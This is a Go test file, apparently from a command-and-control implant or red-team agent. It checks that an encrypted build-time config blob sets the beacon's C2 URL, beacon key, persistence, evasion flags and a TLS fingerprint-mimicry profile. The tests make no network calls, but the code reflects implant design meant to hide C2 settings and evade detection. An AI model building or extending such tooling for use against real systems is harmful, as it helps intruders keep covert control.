package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"testing"
)

// obfuscateForTest mirrors the server-side payload.obfuscateBlobKeyed format:
// AES-256-GCM with the strxor-delivered SConfigKey. The test installs its own
// per-test key (the production default is empty/fail-closed), exactly as the
// builder would inject one via -ldflags -X main.SConfigKey.
func obfuscateForTest(t *testing.T, plain []byte) string {
	t.Helper()
	const testKeyHex = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
	if SConfigKey == "" {
		SConfigKey = obfuscate(testKeyHex)
	}
	key, err := hex.DecodeString(s(SConfigKey))
	if err != nil {
		t.Fatal(err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}
	nonce := make([]byte, gcm.NonceSize())
	for i := range nonce {
		nonce[i] = byte(i*7 + 3)
	}
	sealed := gcm.Seal(nonce, nonce, plain, nil)
	return base64.StdEncoding.EncodeToString(sealed)
}

func TestLoadConfigBlobAppliesOverDefaults(t *testing.T) {
	blob := agentConfigBlob{
		C2URL:           "http://blob.test:8443",
		Interval:        "7",
		Jitter:          "5",
		UserAgent:       "BlobUA/1.0",
		Persist:         "true",
		BeaconKey:       "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcd",
		ListenerID:      "2",
		DNSDomain:       "blob.dns.test",
		BeaconURI:       "/api/v1/beacon",
		Evasion:         "true",
		Proxy:           "http://proxy.blob:8080",
		BeaconTransport: "http",
	}
	raw, err := json.Marshal(blob)
	if err != nil {
		t.Fatal(err)
	}

	orig := ConfigBlob
	origC2 := C2URL
	origKey := BeaconKeyStr
	origURI := BeaconURIStr
	origEvasion := EvasionStr
	defer func() {
		ConfigBlob = orig
		C2URL = origC2
		BeaconKeyStr = origKey
		BeaconURIStr = origURI
		EvasionStr = origEvasion
	}()

	ConfigBlob = obfuscateForTest(t, raw)
	C2URL = "http://default.orig:8080"
	BeaconKeyStr = ""
	BeaconURIStr = ""
	EvasionStr = "false"

	loadConfigBlob()

	if C2URL != "http://blob.test:8443" {
		t.Errorf("C2URL not applied: %q", C2URL)
	}
	if IntervalStr != "7" {
		t.Errorf("IntervalStr not applied: %q", IntervalStr)
	}
	if BeaconKeyStr != blob.BeaconKey {
		t.Errorf("BeaconKeyStr not applied")
	}
	if DNSDomain != "blob.dns.test" {
		t.Errorf("DNSDomain not applied: %q", DNSDomain)
	}

	// Empty blob must be a no-op over defaults.
	ConfigBlob = ""
	loadConfigBlob()
	if C2URL != "http://blob.test:8443" {
		t.Errorf("empty blob should not clear already-applied values, got %q", C2URL)
	}
}

// TestConfigBlobAppliesTLSFingerprint proves the build-time ClientHello option
// travels through the blob into the variables initJA3Rotation() reads.
func TestConfigBlobAppliesTLSFingerprint(t *testing.T) {
	raw, err := json.Marshal(agentConfigBlob{Chameleon: "true", ChameleonProfile: "firefox"})
	if err != nil {
		t.Fatal(err)
	}
	origBlob, origFlag, origProfile := ConfigBlob, ChameleonStr, ChameleonProfileStr
	defer func() {
		ConfigBlob, ChameleonStr, ChameleonProfileStr = origBlob, origFlag, origProfile
	}()

	ChameleonStr = "false"
	ChameleonProfileStr = "random"
	ConfigBlob = obfuscateForTest(t, raw)
	loadConfigBlob()

	if ChameleonStr != "true" {
		t.Fatalf("ChameleonStr = %q, want true", ChameleonStr)
	}
	if ChameleonProfileStr != "firefox" {
		t.Fatalf("ChameleonProfileStr = %q, want firefox", ChameleonProfileStr)
	}
}
